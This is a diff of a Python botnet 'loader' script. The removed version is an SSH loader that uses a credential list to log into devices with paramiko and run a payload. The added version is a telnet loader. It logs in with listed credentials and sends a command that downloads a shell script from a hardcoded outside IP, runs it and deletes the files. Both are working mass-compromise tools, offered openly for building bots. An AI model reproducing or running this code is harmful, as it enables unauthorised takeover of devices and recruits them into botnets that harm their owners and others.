@@ -1,97 +1,79 @@
-#Feel free to use the SSH Loader, uses multi threads to read lines and load all at once.
-#Some of the code was re-written by me [Riyzz] for better preformance and read from a different file for better optimization.
-#And not some next ass shitty slow SSH Loader.
+#!/usr/bin/python
+# Simple Telnet Loader Modified by Deeznuts? 
+# You Can Find Fresh TELNET List To Load @ http://godz56.tk/telnet-list/
+# Modified with more tweaks.
 
-#This was kept private for at least 2 years lol but now i will just be handing it out to the com skids who need bots.
-
-import sys, re, os, paramiko, socket, json
+import sys, re, os, socket, time
 from threading import Thread
-from time import sleep
- 
-if len(sys.argv) < 2:
-    sys.exit("\033[37mUsage: python "+sys.argv[0]+" [vuln list]")
- 
-paramiko.util.log_to_file("/dev/null")
-with open("payload.txt", "r") as payload:
-    rekdevice=payload.readline()
-print "\033[31m"
 
-print "SSH Loader re-written by Riyzz"
- 
-threads = int(1000)
- 
-lines = open(sys.argv[1],"r").readlines()
- 
-fh = open("sshopen.txt","a+")
- 
-def chunkify(lst,n):
-    return [ lst[i::n] for i in xrange(n) ]
- 
-running = 0
- 
-loaded = 0
- 
-def printStatus():
-    while 1:
-        sleep(10)
-        print "\033[1;31mTotal \033[1;33mMMXR \033[1;31mLoaded: " + str(loaded) + "\033[37m"
-        if loaded >= 1000:
-            print "\033[1;31mBig Bots has been loaded"
- 
-def haxit(username,password,ip):
-    try:
-        port = 22
-        ssh = paramiko.SSHClient()
-        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-        ssh.connect(ip, port = port, username=username, password=password, timeout=3)
-        ssh.exec_command(rekdevice)
-        print "\033[1;31mA SSH device has been \033[1;33m[infected] \033[1;31mand sent to the payload: \033[1;33m" + ip + "\033[1;33m"
-        sleep(10)
-        loaded += 1
-        ssh.close()
-    except:
-        pass
- 
-def check(chunk, fh):
-    global running
-    running += 1
-    threadID = running
-    for login in chunk:
-        login = login.replace("DUP ", "")
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.settimeout(3)
-        try:
-            s.connect((login.split(":")[2], 22))
-            s.close()
-            print "\033[1;31m>>" + login + " \033[1;31mSSH device still needs to be infected \033[1;33m[LOADING NOW]"
-            haxit(login.split(":")[0], login.split(":")[1], login.split(":")[2])
-            fh.write(login + "\r\n")
-            fh.flush()
-        except:
-            pass
-    print "\033[1;31mThis \033[1;33mThread " + str(threadID) + " \033[1;31mhas \033[1;33msuccesfully finished \033[1;31mloading " + str(len(chunk)) + " \033[1;31mIP Loaded: \033[1;33m" + str(loaded)
-    running -= 1
- 
-lines = map(lambda s: s.strip(), lines)
- 
-chunks = chunkify(lines, threads)
- 
-print "\033[1;32mAll threads are ready to scan and load to your payload"
- 
-Thread(target = printStatus, args = ()).start()
- 
-for thread in xrange(0,threads):
-    if thread >= 384:
-        sleep(0.2)
-    try:
-        Thread(target = check, args = (chunks[thread], fh,)).start()
-    except:
-        pass
-print "\033[1;31mAll devices that was \033[1;33minfected \033[1;31mhas been completed. \033[1;33mPress Enter 3 \033[1;31mtimes to quit out"
- 
-for i in range(0,3):
-    raw_input()
- 
-fh.close()
- 
-os.popen("kill -9 " + str(os.getpid()))
+if len(sys.argv) < 2:
+	sys.exit("\033[37mUsage: python "+sys.argv[0]+" [list]")
+
+cmd="cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://95.140.156.252/hidakibest.sh; chmod 777 hidakibest.sh; sh hidakibest.sh; rm -rf *" #command to send
+info = open(str(sys.argv[1]),'a+')
+
+def sqwad(ip,username,password):
+	ip = str(ip).rstrip("\n")
+	username = username.rstrip("\n")
+	password = password.rstrip("\n")
+	try:
+		tn = socket.socket()
+		tn.settimeout(5)
+		tn.connect((ip,23))
+	except Exception:
+		print "\033[32m[\033[31m+\033[32m] \033[31mFailed To Connect!\033[37m %s"%(ip)
+		tn.close()
+	try:
+		hoho = ''
+		hoho += readUntil(tn, "ogin")
+		if "ogin" in hoho:
+			tn.send(username + "\n")
+			print "\033[32m[\033[31m+\033[32m] \033[35mSending Username!\033[37m %s"%(ip)
+			time.sleep(0.09)
+		else:
+			pass
+	except Exception:
+		tn.close()
+	try:
+		hoho = ''
+		hoho += readUntil(tn, "assword:")
+		if "assword" in hoho:
+			tn.send(password + "\n")
+			print "\033[32m[\033[33m+\033[32m] \033[36mSending Password!\033[37m %s"%(ip)
+			time.sleep(2)
+		else:
+			pass
+	except Exception:
+		tn.close()
+	try:
+		tn.send("sh" + "\n")
+		time.sleep(0.05)
+		tn.send(cmd + "\n")
+		print "\033[32m[\033[31m+\033[32m] \033[32mCommand Sent!\033[37m %s"%(ip) #False possitives because thats what yall wanted lmao
+		time.sleep(15)
+		tn.close()
+	except Exception:
+		tn.close()
+
+def readUntil(tn, string, timeout=8):
+	buf = ''
+	start_time = time.time()
+	while time.time() - start_time < timeout:
+		buf += tn.recv(1024)
+		time.sleep(0.01)
+		if string in buf: return buf
+	raise Exception('TIMEOUT!')
+
+for x in info:
+	try:
+		if ":23 " in x:
+			x = x.replace(":23 ", ":")
+		xinfo = x.split(":")
+		session = Thread(target=sqwad, args=(xinfo[0].rstrip("\n"),xinfo[1].rstrip("\n"),xinfo[2].rstrip("\n"),))
+		session.start()
+		ip=xinfo[0]
+		username=xinfo[1]
+		password=xinfo[2]
+		time.sleep(0.01)
+	except:
+		pass
